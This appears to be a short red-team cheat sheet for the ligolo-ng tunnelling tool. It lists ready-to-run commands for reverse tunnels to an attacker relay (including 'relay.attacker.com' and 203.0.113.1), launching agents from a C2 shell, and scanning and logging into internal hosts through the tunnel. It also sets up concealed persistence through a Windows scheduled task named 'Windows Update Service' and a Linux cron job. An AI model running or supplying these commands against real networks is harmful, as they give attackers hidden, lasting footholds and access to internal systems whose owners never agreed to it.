## Basic Setup
sudo ligolo-ng relay -addr 0.0.0.0:11601
./ligolo-ng agent -connect 203.0.113.1:11601 --insecure

## Direct Nmap Scanning
sudo nmap -sV -p 22,3306,5432 10.0.0.0/24

## Multi-Tool Through Tunnel
ssh admin@10.0.1.50
mysql -h 10.0.2.20 -u dbadmin -p
curl http://10.0.1.100/admin

## Reverse Tunnel
sudo ligolo-ng relay -addr 0.0.0.0:11601
./ligolo-ng agent -connect relay.attacker.com:11601 --insecure

## From C2
> shell ./ligolo-ng agent -connect 203.0.113.1:11601 --insecure &

## Persistence (Windows)
schtasks /create /tn "Windows Update Service" /tr "C:\Windows\System32\ligolo-ng.exe -connect 203.0.113.1:11601 --insecure" /sc onlogon

## Persistence (Linux)
echo "*/5 * * * * /usr/local/bin/ligolo-ng -connect 203.0.113.1:11601 --insecure" | crontab -

## Service Mode
# /etc/systemd/system/ligolo-relay.service
# ExecStart=/usr/local/bin/ligolo-ng relay -addr 0.0.0.0:11601

## Multiple Agents
# On relay, both agents connect:
# ip route show | grep tun0 # Shows both 10.0.1.0/24 and 10.0.2.0/24
